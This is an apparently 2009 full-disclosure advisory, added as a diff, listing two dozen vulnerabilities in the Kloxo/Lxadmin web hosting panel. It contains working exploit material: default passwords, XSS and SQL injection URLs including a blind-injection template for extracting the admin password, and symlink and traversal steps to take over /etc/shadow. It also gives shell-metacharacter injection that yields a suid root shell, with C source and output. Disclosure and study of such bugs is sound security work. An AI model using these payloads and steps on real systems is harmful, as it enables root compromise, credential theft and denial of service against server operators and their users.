@@ -1,0 +1,721 @@
+#####################################################################
+#
+#  Who  : http://lxlabs.com
+#
+#  What : kloxo
+# 
+#  "Kloxo (Previously Lxadmin) The most flexible software on this
+#  planet. From Kloxo HostInaBox, World's lightest and the most
+#  efficient webhosting platform, to Kloxo Enterprise, which can
+#  manage 100s of thousands of domains on hundreds of servers. Kloxo
+#  is a fully scriptable, distributed, 100% object oriented hosting
+#  platform. There is nothing in the hosting industry that's even
+#  comparable to Kloxo in its sheer flexibility."
+#
+#  =============================================
+#  A few dozen lxadmin / kloxo bugs
+#  Tested on centos-5-i386-hostinabox575.tar.gz
+#  =============================================
+#
+#  Timeline :
+#
+#  05/21/2009 - sent initial email to vendor with a link to a private
+#               resource for viewing various kloxo hiab575
+#               vulnerability info
+#
+#  05/23/2009 - received the following: "Thanks for the info. I will
+#               review this and let you know." (no signature)
+#
+#  05/30/2009 - sent an email asking if there were any updates
+#
+#  06/01/2009 - received the following: "Sorry for the delay. I am
+#               currently looking into this, and will reply in a couple
+#               of hours time." (no signature)
+#
+#  06/04/2009 - nothing heard from vendor, and the private resource
+#               containing the vulnerability info still does not
+#               appear to have been accessed
+#
+#  2 weeks have passed since the initial notification. Vendor appears
+#  uninterested.
+#
+#  Don't drink the Kool-Aid. None of these things are entirely true:
+#  http://lxlabs.com/software/kloxo/security/
+#
+#  Some are just blatantly false. If you want proof, just keep
+#  reading, but try not to fall asleep. These are mostly incredibly
+#  trivial and boring issues.
+#  
+#####################################################################
+
+
+#####################################################################
+#  ISSUE #1 - uid/gid reuse
+#####################################################################
+
+Kloxo / Lxadmin allows unprivileged users to create and remove user
+accounts. This is a common feature of the more popular webhosting
+control, whereby the users with this privilege are referred to as
+"resellers".
+
+1. A reseller creates an account called "user1", which is automatically
+assigned the next available uid and gid on the system (1012.1012 for
+this example).
+
+2. The reseller then logs into the user1 account, such as via FTP.
+
+3. As user1, they upload a file, let's say to /home/user1/testfile
+
+4. As user1, they copy or move testfile to /tmp
+
+5. Now, as the reseller, they remove the user1 account. When the user1
+account was removed, all of /home/user1 was destroyed. However, the
+testfile file will still exist in /tmp, and will have the uid and gid
+which user1 previously held (let's say 1012.1012).
+
+6. The reseller then creates a new account, let's call it "user2".
+
+7. "user2" now owns /tmp/testfile, because the uid and gid 1012.1012
+were the next available ids.
+
+The problem with this design is that the testfile could have been a
+suid/sgid helper shell, with calls to setregid(1012,1012) and
+setreuid(1012,1012), and the reseller could have waited for the next
+account to be created. Once the new account was created (perhaps by
+another reseller, or by root as a staff account, etc), the reseller
+could execute the helper shell and have full access to the new user's
+account.
+
+
+#####################################################################
+#  ISSUE #2 - unprivileged port use
+#####################################################################
+
+By default, Kloxo / Lxadmin uses multiple unprivileged ports: 7776,
+7777, 7778, and 7779. In the event that a service responsible for
+using those ports (kloxo.httpd and kloxo.exe) stops listening on
+them, a local user can bind to the port, preventing kloxo from using
+it until it is freed.
+
+Note: not all ports were tested. This was tested simply by 1) stopping
+kloxo, 2) listening on port 7777, and 3) attempting to restart kloxo.
+
+kloxo did not attempt to take control of the port. 7777/7778 are the
+login ports for kloxo, so a local user could craft an authentic looking
+login page and obtain the username and password of the next person
+attempting to log in.
+
+
+#####################################################################
+#  ISSUE #3 - default passwords
+#####################################################################
+
+"21232f297a" is the default password to the kloxo db, which contains
+the base64 encoded admin password, which is more or less a user with
+full root privileges.
+
+"pass" is the default roundcube db password.
+
+"admin" is the default password for the root account, and for the
+admin account.
+
+Are there more? Are these documented anywhere? Do all lxlabs products
+contain default passwords?
+
+
+#####################################################################
+#  ISSUE #4 - useradd string in the process list
+#####################################################################
+
+When a new account is created via lxadmin / kloxo, the useradd string
+appears in the process list, complete with password hash.
+
+
+#####################################################################
+#  ISSUE #5 - XSS
+#####################################################################
+
+Surely there are plenty more:
+
+:7778/display.php?frm_action=XSS
+:7778/display.php?frm_action=delete&frm_o_cname=XSS
+
+The software does tie the user's IP address to the session, but this
+could be problematic for people behind the same proxy, or those on
+networks where non SSL based web traffic could appear to come from
+any of a number of hosts at any given time (e.g., AOL. Do they still
+do this? Are there others that do the same?).
+
+
+#####################################################################
+#  ISSUE #6 - remotely create partially user controlled file names
+#             and directories. Locally append uncontrolled data to
+#             any file
+#####################################################################
+
+1. Browse to http://x.x.x.x:7778 (or domain:7778)
+
+2. In the username field, enter anything, valid account or not. We'll
+use: test
+
+3. In the password field, enter anything. We'll use: test
+
+4. Click the login button
+
+This will cause this directory:
+/usr/local/lxlabs/kloxo/log
+
+to now have this file:
+Failed Login attempt to test from x.x.x.x
+
+(where x.x.x.x is the IP address that the failed login attempt came
+from, of course).
+
+Note that the file is written as root.
+
+Now append a "/" to "test" and attempt to log in again.
+
+This causes the following directory to be created:
+/usr/local/lxlabs/kloxo/log/Failed Login attempt to test
+
+which contains this file:
+ from x.x.x.x
+
+Directory traversal can also be used, which will ultimately allow a
+local user to append data to any file on the box via a symlink attack.
+
+
+Directory traversal example on the login page:
+
+username: ../../../../../../../../hello
+password: test
+
+[root@testing574 /usr/local/lxlabs/kloxo/log]# ls -l / | grep hello
+-rw-r--r--  1 root root     24 May 19 16:56 hello from x.x.x.x
+
+Since the user can control the location on the filesystem that the
+file will be written to, they can use a symlink attack to append junk
+to the end of a file:
+
+
+1. [user1@testing574 /tmp]$ ln -s /etc/resolv.conf 'test from x.x.x.x'
+
+* Replace "x.x.x.x" with the IP address that you'll be attempting to
+log in from.
+
+
+2. Attempt to log in with the username: ../../../../../../../tmp/test
+and any password
+
+
+3. Now observe that /etc/resolv.conf had data appended to it:
+
+[user1@testing574 tmp]$ cat /etc/resolv.conf
+nameserver 4.2.2.1
+nameserver 4.2.2.2
+20:09 May/20/2009: NULL
+
+
+#####################################################################
+#  ISSUE #7 - local users can take control of any file or directory
+#####################################################################
+
+Local users can take control over any file on the host when adding a
+domain. This is done via a symlink attack.
+
+Observe the following from the /usr/local/lxlabs/kloxo/log/shell_exec
+log when an account is created:
+
+13:46 May/18/2009: 0:  [(__system__:/usr/local/lxlabs/kloxo/httpdocs) 'chmod'  '0755' '/home/clientname/example.com']
+13:46 May/18/2009: 0:  [(__system__:/usr/local/lxlabs/kloxo/httpdocs) 'chown'  '-R' 'clientname:clientname' '/home/clientname/example.com']
+
+All the user needs to do is symlink example.com to the resource they
+want to take control of, then add the domain. This will give the
+resource permissions of 755, uid.gid user.apache:
+
+[user1@testing574 user1]$ ls -l /etc/shadow
+-rwxr-xr-x 1 user1 apache 1415 May 19 17:05 /etc/shadow
+
+
+This also works when adding subdomains.
+
+
+#####################################################################
+#  ISSUE #8 - local users can take control of any file or directory
+#####################################################################
+
+Local users can take ownership of any file via a symlink attack when
+adding FTP users. Only the user ownership is changed.
+
+1. Log into Kloxo
+
+2. Click "Ftp Users"
+
+3. Click "Add Ftp User"
+
+4. In the "Ftp User Name" box, type: example
+
+5. In the "Password" and "Confirm Password" boxes, type whatever you'd like
+
+6. In the "Virtual Directory" box, type: example
+
+7. Before adding the FTP user, create a symlink for /home/username/example to
+/etc/shadow:
+
+[user1@testing574 user1]$ ln -s /etc/shadow example
+
+8. Click "Add"
+
+Observe that the user now owns /etc/shadow:
+
+[user1@testing574 user1]$ ls -l /etc/shadow
+-r-------- 1 user1 root 1415 May 19 17:05 /etc/shadow
+
+
+#####################################################################
+#  ISSUE #9 - local users can overwrite any file on the box
+#####################################################################
+
+Local users can overwrite arbitrary files via symlink attacks when
+using the "InstallApp" feature.
+
+1. Log into Kloxo as a regular user (not a reseller)
+
+2. Click "InstallApp"
+
+3. Click "WordPress"
+
+4. Click "Install This Application"
+
+5. In the box titled "Location", enter: example
+
+6. In the shell, create the following directory:
+/home/username/example.com/example
+
+where "username" is the username of the account that you are attempting to
+install WordPress on, and
+
+where "example.com" is the DocumentRoot of the domain that you are installing
+WordPress on.
+
+7. Now cd into the "example" directory and symlink a file to
+__kloxo_directory_list:
+
+[user1@testing574 /home/user1/example.com/example]$ ln -s /etc/resolv.conf __kloxo_directory_list
+
+8. Now go back to Kloxo and click "Install"
+
+Observe that /etc/resolv.conf has been destroyed:
+
+[user1@testing574 /home/user1/example.com/example]$ cat /etc/resolv.conf
+b:0;
+
+I've never seen this feature actually install anything.
+
+
+#####################################################################
+#  ISSUE #10 - yet another symlink attack for local users
+#####################################################################
+
+Local users can create arbitrary directories anywhere on the
+filesystem via directory traversal when adding a new domain. They
+can also take control over any directory on the filesystem.
+
+1. Log into Kloxo
+
+2. Click "Domains"
+
+3. In the field labeled "Domain Name", type: example.com
+
+4. In the field labeled "Document Root", enter: ../../../../../../test
+
+Observe that the directory /test has now been created:
+
+[user1@testing574 /home/user1]$ ls -l / | grep test
+drwxr-xr-x  4 user1 apache   4096 May 21 12:28 test
+
+
+
+Alternately, the user can enter the name of an existing directory to take
+control over it, such as: ../../../../../../etc
+
+or even: ../../../../../../../../
+
+which will result in this:
+
+[user1@testing574 /]$ ls -al /
+total 288
+drwxr-xr-x 25 user1 apache   4096 May 21 12:32 .
+drwxr-xr-x 25 user1 apache   4096 May 21 12:32 ..
+-rw-r--r--  1 user1 user1       0 May 18 21:44 .autofsck
+-rw-r--r--  1 user1 user1       0 May 18 21:44 .autorelabel
+-rw-------  1 user1 user1    1024 May 21 01:50 .rnd
+lrwxrwxrwx  1 user1 user1      39 May 18 21:44 aquota.group -> /proc/vz/vzaquota/00000020/aquota.group
+lrwxrwxrwx  1 user1 user1      38 May 18 21:44 aquota.user -> /proc/vz/vzaquota/00000020/aquota.user
+drwxr-xr-x  2 user1 user1    4096 May 14 10:38 bin
+drwxr-xr-x  2 user1 user1    4096 Mar 29  2007 boot
+drwxr-xr-x  2 user1 user1    4096 May 21 12:32 cgi-bin
+drwxr-xr-x  2 user1 user1    4096 May 13 06:40 command
+drwxr-xr-x  4 user1 user1  122880 May 18 21:45 dev
+drwxr-xr-x 56 user1 user1    4096 May 21 12:30 etc
+drwxr-xr-x 14 user1 user1    4096 May 18 23:38 home
+drwxr-xr-x 10 user1 user1    4096 May 13 06:38 lib
+drwxr-xr-x  2 user1 user1    4096 Mar 29  2007 media
+drwxr-xr-x  2 user1 user1    4096 Mar 29  2007 mnt
+drwxr-xr-x  2 user1 user1    4096 Mar 29  2007 opt
+dr-xr-xr-x 44 user1 user1       0 May 18 21:44 proc
+drwxr-xr-x  7 user1 user1    4096 May  8 02:46 program-install
+-rw-r--r--  1 user1 user1   68088 May 13 02:24 program-install.zip
+drwx------  4 user1 user1    4096 May 21 12:28 root
+drwxr-xr-x  2 user1 user1    4096 May 13 06:38 sbin
+drwxr-xr-x  3 user1 user1    4096 May 18 21:44 script
+drwxr-xr-x  2 user1 user1    4096 Mar 29  2007 selinux
+drwxr-xr-x  2 user1 user1    4096 Oct  6  2008 service
+drwxr-xr-x  2 user1 user1    4096 Mar 29  2007 srv
+drwxr-xr-x  3 user1 user1       0 May 18 21:44 sys
+drwxrwxrwt  2 user1 user1    4096 May 21 12:32 tmp
+drwxr-xr-x 14 user1 user1    4096 May 13 06:42 usr
+drwxr-xr-x 25 user1 user1    4096 May 14 10:39 var
+
+
+#####################################################################
+#  ISSUE #11 - metachar injection, local command execution as root
+#####################################################################
+
+Local users can execute any command(s) of their choice as root via
+metacharacter injection in the backup initial string.
+
+1. Log into Kloxo
+
+2. Click "Backup Home"
+
+3. In the box titled "Backup File Initial String", enter:
+; /bin/touch /tmp/i_am_root ;
+
+4. Click "Backup Now"
+
+Observe:
+
+[user1@testing574 user1]$ ls -l /tmp/i_am_root
+-rw-r--r-- 1 root root 0 May 20 21:50 /tmp/i_am_root
+
+
+#####################################################################
+#  ISSUE #12 - web stats world readable password hashes
+#####################################################################
+
+Local users can obtain the password hashes from the stats page
+protection files.
+
+1. Log into Kloxo
+
+2. Click "Stats Page Protection"
+
+3. In the field titled "Statistics Page Password", enter a password
+
+The hash of that password will be placed into a world readable file here:
+/home/httpd/example.com/__dirprotect/__stats
+
+where "example.com" is the domain onto which the stats password was added.
+
+
+#####################################################################
+#  ISSUE #13 - local users can overwrite any file on the box
+#####################################################################
+
+Local users can overwrite any file of their choice via a symlink
+attack when adding parked and redirected domains.
+
+1. Log into Kloxo
+
+2. Click "Parked / Redirected Domains"
+
+3. Click "Add Parked"
+
+4. In the box titled "Pointer Domain", enter: example.com
+
+5. From the shell, cd to /home/httpd/domainname/
+where "domainname" is the directory onto which the Pointer Domain is being
+parked.
+
+6. Rename, or remove, perlsuexec.sh
+
+7. Now create a symlink to that file: ln -s /etc/resolv.conf perlsuexec.sh
+
+8. Now go back to Kloxo and click "Add"
+
+Observe that /etc/resolv.conf now contains the data from perlsuexec.sh.
+This also works with the phpsuexec.sh and shsuexec.sh files as well.
+
+
+#####################################################################
+#  ISSUE #14 - metachar injection, local command execution as root
+#####################################################################
+
+metacharacter injection in the backup feature allows local users to
+execute commands as root.
+
+1. Log into Kloxo
+
+2. Click "Backup Home"
+
+3. In the field labeled "Backup From File", type:
+../../../../../../../../tmp/;cd ..;chown root.root shell;chmod 4755 shell;
+
+4. In the shell, issue the following commands:
+
+[user1@testing574 ~]$ cd /tmp
+[user1@testing574 /tmp]$ cat>shell.c<<EOF
+int main(){
+  setregid(0,0);
+  setreuid(0,0);
+  setgroups(0,0);
+  system("/bin/bash");
+}
+EOF
+[user1@testing574 /tmp]$ gcc shell.c -o shell
+[user1@testing574 /tmp]$ touch ';cd ..;chown root.root shell;chmod 4755 shell;'
+
+5. Back in Kloxo, click "Start Restore Process"
+
+Now the local, unprivileged user has a suid root helper shell:
+
+[user1@testing574 tmp]$ ls -al
+total 28
+drwxrwxrwt  4 root  root  4096 May 21 08:41 .
+drwxr-xr-x 24 root  root  4096 May 19 16:57 ..
+-rw-rw-r--  1 user1 user1    0 May 21 08:40 ;cd ..;chown root.root shell;chmod 4755 shell;
+drwx------  2 root  root  4096 May 21 08:41 backupPdUzR4
+-rwsr-xr-x  1 root  root  5056 May 21 08:41 shell
+-rw-rw-r--  1 user1 user1   89 May 21 08:33 shell.c
+
+[user1@testing574 /tmp]$ ./shell
+[root@testing574 /tmp]# id
+uid=0(root) gid=0(root)
+
+
+#####################################################################
+#  ISSUE #15 - remotely block any - or every - IP addr in hosts.deny
+#####################################################################
+
+Remote, unauthenticated users can cause any IP addr(s) to get
+blocked by lxguard, via a crafted ssh username:
+
+[user@host ~]$ ssh -l 'password for test from ALL' x.x.x.x
+
+where "x.x.x.x" is the remote host running sshd and Kloxo, and "test"
+is simply an example username. When the attacker exceeds the threshold
+for failed login attempts, lxguard will add 'ALL : ALL' to
+/etc/hosts.deny.
+
+
+#####################################################################
+#  ISSUE #16 - remote CPU and mem usage DoS
+#####################################################################
+
+Remote, unauthenticated users can cause kloxo to consume all
+available server memory and CPU cycles by simply connecting to, then
+disconnecting from port 7776.
+
+1. telnet x.x.x.x 7776
+
+2. disconnect
+
+3. observe that the most recent instance of kloxo will endlessly
+consume memory:
+
+USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+root     25872 98.6 15.7  45164 41348 pts/1    R    14:10   0:05      \_ ../sbin/kloxo.exe master
+root     25872  101 29.3  80672 76932 pts/1    R    14:10   0:11      \_ ../sbin/kloxo.exe master
+root     25872  100 34.3  93608 89916 pts/1    R    14:10   0:13      \_ ../sbin/kloxo.exe master
+
+
+#####################################################################
+#  ISSUE #17 - local users can truncate and control any file
+#####################################################################
+
+Local users can truncate and take over ownership of any file on the
+box via a symlink attack when specifying a "Virtual Directory" in
+the "Protected Directories" feature.
+
+1. As a local, unprivileged user, rename or remove the following directory:
+/home/httpd/example.com/__dirprotect
+
+where "example.com" is the name of the domain for which we will be creating
+a protected directory.
+
+2. cd /home/httpd/example.com/__dirprotect/
+
+3. ln -s /etc/resolv.conf test_
+
+4. Log into Kloxo
+
+5. Click the "Protected Directories" link
+
+6. In the "Auth Name" box, type anything
+
+7. In the "Virtual Directory" box, type: test
+
+8. Click "Add"
+
+This is the result, note the ownership and the file size:
+
+-rwxr-xr-x 1 user1 root 0 May 25 07:48 /etc/resolv.conf
+
+
+#####################################################################
+#  ISSUE #18 - just 2 more symlinks to own any file on the box
+#####################################################################
+
+1. [user1@testing574 ~]$ while true ; do ln -s /etc/resolv.conf
+/home/lxadmin/mail/domains/example.com/postmaster/.bogopref.cf ; done
+
+2. create new account in kloxo for example.com
+
+
+[user1@testing574 ~]$ ls -l /etc/resolv.conf
+-rw-r--r-- 1 user1 user1 185 May 25 16:29 /etc/resolv.conf
+
+[user1@testing574 ~]$ cat /etc/resolv.conf
+spam_cutoff  0.7
+spam_subject_tag=******SPAM******
+wordlist R,user,postmaster_example_com.wordlist.db,1
+wordlist R,system,wordlist.db,2
+wordlist R,system,kloxo.wordlist.db,3
+
+
+
+This also works for:
+/home/lxadmin/mail/domains/example.com/postmaster/.maildroprc
+
+
+[root@testing574 ~]# ls -l /etc/resolv.conf
+-rwx------ 1 user1 user1 377 May 26 06:14 /etc/resolv.conf
+
+
+[root@testing574 ~]# cat /etc/resolv.conf
+SHELL=/bin/sh
+
+if ( $SIZE < 96144 )
+{
+exception  {
+xfilter "bogofilter -d /var/bogofilter/ -ep -c /home/lxadmin/mail/domains/example.com/postmaster/.bogopref.cf"
+}
+}
+ if ( /^X-Bogosity: Spam, tests=bogofilter/ )
+{
+ to /home/lxadmin/mail/domains/example.com/postmaster/Maildir
+ }
+
+to /home/lxadmin/mail/domains/example.com/postmaster/Maildir/
+
+
+#####################################################################
+#  ISSUE #19 - file manager, view and edit any file
+#####################################################################
+
+Local users can view and edit the contents of any file via the
+File Manager.
+
+1. From the shell, create a hard link to the file to view or take
+control of:
+[user1@host ~]$ ln /etc/shadow
+
+2. Log into Kloxo
+
+3. Click "File Manager"
+
+4. Click "shadow"
+
+The file can also be edited.
+
+
+#####################################################################
+#  ISSUE #20 - file manager PT II
+#####################################################################
+
+Local users can create new files, overwrite the contents of, and take
+ownership of any file on the box.
+
+1. Log into Kloxo
+
+2. Click "File Manager"
+
+3. Click "Upload" (upload a file called: test)
+
+4. From the shell:
+[user1@testing574 ~]$ while true ; do rm -f test ; ln -s /etc/shadow test ; done
+
+5. Click "Upload"
+
+
+#####################################################################
+#  ISSUE #21 - file manager PT III
+#####################################################################
+
+Local users can edit any file on the box via symlink attack when creating a new
+file in the File Manager.
+
+1. Log into Kloxo
+
+2. Click "File Manager"
+
+3. Click "Newfile"
+
+4. In the box labeled "File Name", type: test
+
+5. From the shell:
+[user1@testing574 ~]$ ln /etc/shadow test
+
+6. Click "Update"
+
+The file is now displayed to the user, and can be edited as well.
+
+
+#####################################################################
+#  ISSUE #22 - local user symlink attack
+#####################################################################
+
+It's pointless to continue to documenting symlink attacks in this
+software. The software appears to use root for nearly everything,
+and does not use proper file locking, amongst other things.
+
+This one pertains to the "PHP Config" option, and creating a symlink
+for the file it creates: /home/username/domain/.htaccess
+
+
+#####################################################################
+#  ISSUE #23 - local user symlink attack (last one)
+#####################################################################
+
+When changing ownership of a domain, a symlink attack can be used
+to take control of any file on the box.
+
+
+#####################################################################
+#  ISSUE #24 - sql injection in the "Forgot Password" form
+#####################################################################
+
+You can use any username and email address for this - real or
+otherwise - and the select statement will still be executed.
+Note that the output is not displayed back to the user's client.
+
+http://x.x.x.x:7778/login/index.php?frm_clientname=x' union select now()/*&frm_email=example@example.com&forgot=Send&frm_forgotpwd=2
+
+You can observe the results via strace, however. Note the 
+"2009-06-03 18:54:30" in the query result:
+
+7171  read(6, "\3select contactemail from client where nname = 'x' union select now()/*';", 73) = 73
+
+7171  write(6, "\1\0\0\1\1.\0\0\2\3def\0\0\0\fcontactemail\fcontactemail\f\10\0\377\0\0\0\375\0\0\0\0\0\5\0\0\3\376\0\0\2\0\24\0\0\4\0232009-06-03 18:54:30\5\0\0\5\376\0\0\2\0", 97) = 97
+
+
+The good news is that if you do know a valid username and contactemail
+(as stored in the kloxo db), then you can remotely recover the base64
+encoded kloxo login password for the admin user via brute force. Once
+logged in as "admin", the web based command shell can be used to
+execute commands, which are run as - you guessed it - root.
+
+/login/index.php?frm_clientname=$username' and ' ascii(substring((select realpass from client limit 1),$position,1))>$num/*&frm_email=$email&forgot=Send&frm_forgotpwd=2
+
+# milw0rm.com [2009-06-04]
